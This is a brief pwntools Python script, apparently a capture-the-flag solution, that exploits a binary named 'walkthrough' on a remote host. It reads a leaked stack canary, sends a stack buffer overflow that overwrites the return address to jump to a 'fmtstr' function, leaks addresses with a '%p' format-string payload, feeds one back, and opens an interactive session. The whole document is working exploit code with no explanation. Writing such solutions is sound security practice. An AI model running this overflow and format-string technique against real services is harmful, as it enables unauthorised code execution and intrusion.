from pwn import *
p = remote("147.182.172.217",42001)
e = ELF('./walkthrough')
#p = process(e.path)
context.log_level='debug'
p.recvuntil('later): ')
canary = int(p.recvline(keepends = False), 16)
p.sendline(b'a' * 72 + p64(canary) + b'a' * 8 + p64(e.sym['fmtstr'] + 1))

p.sendline('%p'*14)
p.recvuntil('420420(nil)')
buff = int(p.recv(10),16)
print(hex(buff))
print(buff)
p.sendline(str(buff))
#print(p.recvrepeat(1))
p.interactive()